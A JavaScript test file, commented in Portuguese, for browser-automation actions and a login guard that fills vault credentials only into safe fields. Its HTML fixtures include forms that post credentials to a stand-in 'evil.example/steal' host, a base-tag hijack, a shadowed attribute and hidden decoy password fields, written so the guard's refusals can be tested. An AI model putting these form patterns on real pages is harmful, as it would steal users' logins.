import { test, after } from "node:test";
import assert from "node:assert/strict";
import { createBrowserActions, loginFieldMissingMessage, loginFieldVerdict } from "./browser-actions.mjs";
import { launchFixtureBrowser } from "./test-browser.mjs";

function fakePage({ candidates = [], log = [], fillError, url = "https://erp.test/home" } = {}) {
	let href = url;
	// Folha do locator: o que a escada de cliques usa (evaluate/locator/click).
	const leaf = (name, onClick) => {
		const node = {
			click: async () => { log.push(`click:${name}`); onClick?.(); },
			focus: async () => {},
			first: () => node,
			locator: () => node,
			evaluate: async (fn) =>
				fn.name === "readPointer"
					? null
					: { visible: true, interactive: true, covered: false, cx: 5, cy: 5, target: { tag: "a" } },
		};
		return node;
	};
	const locator = (kind, arg) => ({
		filter: (f) => locator(`${kind}>filter`, f.hasText),
		evaluateAll: async () => candidates,
		nth: (i) => leaf(`${kind}:${arg}#${i}`),
		first: () => leaf(`${kind}:${arg}`, () => { href = "https://erp.test/next"; }),
	});
	return {
		waitForLoadState: async () => {},
		url: () => href,
		title: async () => "ERP",
		evaluate: async (fn) => {
			if (fn?.name === "readProbeInPage") return { idle: 1000, inflight: 0, busy: false };
			if (fn?.name === "readContentInPage") return { len: 500, landmark: true };
			return 1000;
		},
		locator: (sel) => locator(`locator(${sel})`, sel),
		getByText: (t) => locator("getByText", t),
		fill: async (sel, value) => {
			if (fillError) throw new Error(fillError);
			log.push(`fill:${sel}=${value}`);
		},
		keyboard: { type: async (t) => log.push(`kb:${t}`), press: async (k) => log.push(`press:${k}`) },
		mouse: { click: async () => {} },
	};
}

test("browserClick: text com selector genérico clica no texto, não no primeiro link", async () => {
	const log = [];
	const page = fakePage({
		log,
		candidates: [
			{ text: "Página inicial", visible: true },
			{ text: "Incluir proposta", visible: true },
		],
	});
	const actions = createBrowserActions({ getPage: async () => page });
	const result = await actions.browserClick({ selector: "a", text: "Incluir proposta" });
	assert.equal(result.ok, true);
	assert.deepEqual(log, ["click:locator(a)>filter:Incluir proposta#1"]);
});

test("browserClick: selector genérico sozinho nem toca na página", async () => {
	const log = [];
	const actions = createBrowserActions({ getPage: async () => fakePage({ log }) });
	await assert.rejects(actions.browserClick({ selector: "a" }), /browser_snapshot/);
	assert.deepEqual(log, []);
});

test("browserClick: texto ausente dá erro com dica", async () => {
	const actions = createBrowserActions({ getPage: async () => fakePage({ candidates: [] }) });
	await assert.rejects(actions.browserClick({ text: "Nada" }), /Nenhum elemento visível/);
});

test("browserType: alvo que não é campo vira erro claro; retry em navegação", async () => {
	const actions = createBrowserActions({
		getPage: async () => fakePage({ fillError: "Element is not an <input>, <textarea> or [contenteditable]" }),
	});
	await assert.rejects(actions.browserType({ selector: "#x", text: "a" }), /não é um campo editável/);
	let calls = 0;
	const flaky = createBrowserActions({
		wait: async () => {},
		getPage: async () => {
			calls += 1;
			return fakePage({ fillError: calls === 1 ? "Execution context was destroyed" : undefined });
		},
	});
	const typed = await flaky.browserType({ selector: "#x", text: "a" });
	assert.equal(typed.ok, true);
	assert.equal(typed.settled, true);
	assert.equal(calls, 2);
	await assert.rejects(actions.browserType({ selector: "input", text: "a" }), /genérico/);
});

test("browserClick: devolve url/navegou/settled depois do clique", async () => {
	const actions = createBrowserActions({ getPage: async () => fakePage({}) });
	const result = await actions.browserClick({ selector: "#salvar" });
	assert.equal(result.navigated, true);
	assert.equal(result.url, "https://erp.test/next");
	assert.equal(result.settled, true);
	assert.equal(result.title, "ERP");
});

test("Chrome morto no meio da ação: reinicia uma vez e repete", async () => {
	let restarts = 0;
	let calls = 0;
	const log = [];
	const actions = createBrowserActions({
		restart: async () => { restarts += 1; },
		wait: async () => {},
		getPage: async () => {
			calls += 1;
			if (calls === 1) throw new Error("Target page, context or browser has been closed");
			return fakePage({ log });
		},
	});
	const result = await actions.browserClick({ selector: "#ok" });
	assert.equal(result.ok, true);
	assert.equal(restarts, 1);
});

test("navigate repete em ERR_ABORTED e devolve url final", async () => {
	let attempts = 0;
	const page = {
		...fakePage({}),
		goto: async () => { if (++attempts === 1) throw new Error("net::ERR_ABORTED at https://x"); },
	};
	const actions = createBrowserActions({ getPage: async () => page, wait: async () => {} });
	const result = await actions.navigate("https://x");
	assert.equal(attempts, 2);
	assert.equal(result.url, "https://erp.test/home");
});

// ---- Trava do login do Cofre: executada de verdade num Chromium (`loginFieldVerdict` real, HTML real). ----
// Os seletores são os padrões que o runtime manda (vault-tools.ts, DEFAULT_SELECTORS).
const PASSWORD_SELECTOR = 'input[type="password"]';
const USERNAME_SELECTOR =
	'input[autocomplete="username"], input[type="email"], input[name*="user" i], input[name*="email" i], input[name*="login" i], input[id*="user" i], input[id*="email" i], input[id*="login" i], input[type="text"]';

const page = (body, head = "") => `<!doctype html><html><head><meta charset="utf-8"><title>t</title>${head}</head><body>${body}</body></html>`;
const FIXTURES = {
	"/one-screen": page(`<form action="/session" method="post"><input type="text" name="login" id="u"><input type="password" name="pw" id="p"><button>Entrar</button></form>`),
	"/relative-action": page(`<form action="session"><input type="email" id="u"><input type="password" id="p"></form>`),
	// 1ª tela de um login em duas telas: só o usuário.
	"/two-screen": page(`<form action="/next"><input type="email" name="identifier" id="u"><button>Continuar</button></form>`),
	// 1ª tela com um campo qualquer (busca), sem cara de usuário.
	"/search-only": page(`<form action="/s"><input type="text" name="q" id="u"></form>`),
	"/iframe-password": page(`<iframe srcdoc='<input type="password" id="p">'></iframe>`),
	"/other-form": page(`<form id="a"><input type="text" name="user" id="u"></form><form id="b"><input type="password" id="p"></form>`),
	"/text-as-password": page(`<form><input type="text" name="password" id="p"></form>`),
	"/cross-action": page(`<form action="https://evil.example/steal" method="post"><input type="text" name="user" id="u"><input type="password" id="p"></form>`),
	"/cross-formaction": page(`<form action="/ok"><input type="password" id="p"><button formaction="https://evil.example/steal">Entrar</button></form>`),
	"/base-hijack": page(`<form action="session"><input type="password" id="p"></form>`, `<base href="https://evil.example/">`),
	"/shadowed-attr": page(`<form action="https://evil.example/steal"><input name="getAttribute"><input type="password" id="p"></form>`),
	"/hidden-none": page(`<form><input type="password" id="p" style="display:none"></form>`),
	"/hidden-opacity": page(`<form><input type="password" id="p" style="opacity:0"></form>`),
	"/hidden-parent-opacity": page(`<form><div style="opacity:0"><input type="password" id="p"></div></form>`),
	"/hidden-tiny": page(`<form><input type="password" id="p" style="width:1px;height:1px;padding:0;border:0"></form>`),
	"/hidden-offscreen": page(`<form><input type="password" id="p" style="position:absolute;left:-9999px;top:0"></form>`),
	"/hidden-visibility": page(`<form><input type="password" id="p" style="visibility:hidden"></form>`),
	"/hidden-clipped": page(`<form><div style="width:0;height:0;overflow:hidden"><input type="password" id="p" style="width:200px;height:30px"></div></form>`),
	"/hidden-attr": page(`<form><input type="password" id="p" hidden></form>`),
	// Isca oculta primeiro, campo de verdade depois: preenche o de verdade.
	"/decoy-first": page(`<form action="/s"><input type="password" id="decoy" style="display:none"><input type="password" id="p"></form>`),
};

let fixture;
let skip = false;
const ready = (async () => {
	fixture = await launchFixtureBrowser(FIXTURES);
	skip = !fixture;
})();
after(async () => { await fixture?.close(); });

async function withPage(path, run) {
	await ready;
	if (skip) return;
	const p = await fixture.newPage();
	try {
		await p.goto(`${fixture.base}${path}`);
		await run(p, createBrowserActions({ getPage: async () => p, loginGuardWaitMs: 300 }));
	} finally {
		await p.close();
	}
}
const guard = (kind) => ({ kind, origin: fixture.base });
const valueOf = (p, sel) => p.$eval(sel, (el) => el.value);

test("login real: usuário e senha no mesmo formulário (action relativa ou na origem) entram", async () => {
	for (const path of ["/one-screen", "/relative-action"]) {
		await withPage(path, async (p, actions) => {
			await actions.browserType({ selector: USERNAME_SELECTOR, text: "ana", guard: guard("username") });
			await actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", guard: guard("password") });
			assert.equal(await valueOf(p, "#u"), "ana", path);
			assert.equal(await valueOf(p, "#p"), "segredo", path);
		});
	}
});

test("login em duas telas (A1): usuário entra sem campo de senha; a senha acusa campo ausente rápido, com a mensagem real", async () => {
	await withPage("/two-screen", async (p, actions) => {
		await actions.browserType({ selector: USERNAME_SELECTOR, text: "ana@x.com", guard: guard("username") });
		assert.equal(await valueOf(p, "#u"), "ana@x.com");
		const t0 = Date.now();
		await assert.rejects(
			actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", guard: guard("password") }),
			(error) => error.message === "Não achei o campo de senha na página principal; nada foi digitado." && error.message === loginFieldMissingMessage("password"),
		);
		assert.ok(Date.now() - t0 < 2500, "não espera os 30 s do Playwright");
	});
});

test("usuário sem campo de senha na página só entra em campo com cara de usuário (B4)", async () => {
	await withPage("/search-only", async (p, actions) => {
		await assert.rejects(actions.browserType({ selector: USERNAME_SELECTOR, text: "ana", guard: guard("username") }), /^Error: Recusado/);
		assert.equal(await valueOf(p, "#u"), "");
	});
});

test("senha: campo oculto (display, opacidade, pai com opacidade, 1px, fora da tela, visibility, cortado, hidden) nunca recebe", async () => {
	for (const path of ["/hidden-none", "/hidden-opacity", "/hidden-parent-opacity", "/hidden-tiny", "/hidden-offscreen", "/hidden-visibility", "/hidden-clipped", "/hidden-attr"]) {
		await withPage(path, async (p, actions) => {
			await assert.rejects(actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", guard: guard("password") }), /Recusado: o campo está oculto/, path);
			assert.equal(await valueOf(p, "#p"), "", path);
		});
	}
});

test("senha: isca oculta primeiro e campo de verdade depois, vai para o de verdade", async () => {
	await withPage("/decoy-first", async (p, actions) => {
		await actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", guard: guard("password") });
		assert.equal(await valueOf(p, "#p"), "segredo");
		assert.equal(await valueOf(p, "#decoy"), "");
	});
});

test("senha em type=text, em iframe, em outro formulário: recusado ou ausente, nada digitado", async () => {
	await withPage("/text-as-password", async (p, actions) => {
		await assert.rejects(actions.browserType({ selector: "#p", text: "segredo", guard: guard("password") }), /Recusado: a senha só pode/);
		assert.equal(await valueOf(p, "#p"), "");
	});
	await withPage("/iframe-password", async (_p, actions) => {
		await assert.rejects(actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", guard: guard("password") }), /Não achei o campo de senha/);
	});
	await withPage("/other-form", async (p, actions) => {
		await assert.rejects(actions.browserType({ selector: USERNAME_SELECTOR, text: "ana", guard: guard("username") }), /Recusado: o usuário só pode/);
		assert.equal(await valueOf(p, "#u"), "");
	});
});

test("formulário que envia para outra origem (action, formaction, <base>, getAttribute sombreado) recusa usuário e senha (B1)", async () => {
	for (const path of ["/cross-action", "/cross-formaction", "/base-hijack", "/shadowed-attr"]) {
		await withPage(path, async (p, actions) => {
			await assert.rejects(actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", guard: guard("password") }), /envia os dados para outro site/, path);
			assert.equal(await valueOf(p, "#p"), "", path);
		});
	}
	await withPage("/cross-action", async (p, actions) => {
		await assert.rejects(actions.browserType({ selector: USERNAME_SELECTOR, text: "ana", guard: guard("username") }), /envia os dados para outro site/);
		assert.equal(await valueOf(p, "#u"), "");
	});
});

test("origem diferente da validada aborta (conferida dentro da página, no mesmo evaluate do campo) e sem seletor também (B2)", async () => {
	await withPage("/one-screen", async (p, actions) => {
		await assert.rejects(actions.browserType({ selector: PASSWORD_SELECTOR, text: "s", guard: { kind: "password", origin: "https://erp.test" } }), /mudou de site/);
		await assert.rejects(actions.browserType({ text: "s", guard: guard("password") }), /exige um seletor/);
		assert.equal(await valueOf(p, "#p"), "");
		const handle = await p.$("#p");
		assert.equal(await handle.evaluate(loginFieldVerdict, { kind: "password", origin: fixture.base }), "ok");
		assert.equal(await handle.evaluate(loginFieldVerdict, { kind: "password", origin: "https://outro.example" }), "other-origin");
	});
});

test("submit com origem igual envia o formulário (Enter) com o campo preenchido; guard inválido é recusado", async () => {
	await withPage("/one-screen", async (p, actions) => {
		await p.evaluate(() => { window.__enter = 0; document.querySelector("form").addEventListener("submit", (event) => { event.preventDefault(); window.__enter += 1; }); });
		await actions.browserType({ selector: PASSWORD_SELECTOR, text: "segredo", submit: true, guard: guard("password") });
		assert.equal(await p.evaluate(() => window.__enter), 1);
		await assert.rejects(actions.browserType({ selector: "#p", text: "x", guard: { kind: "totp" } }), /guard inválido/);
	});
});
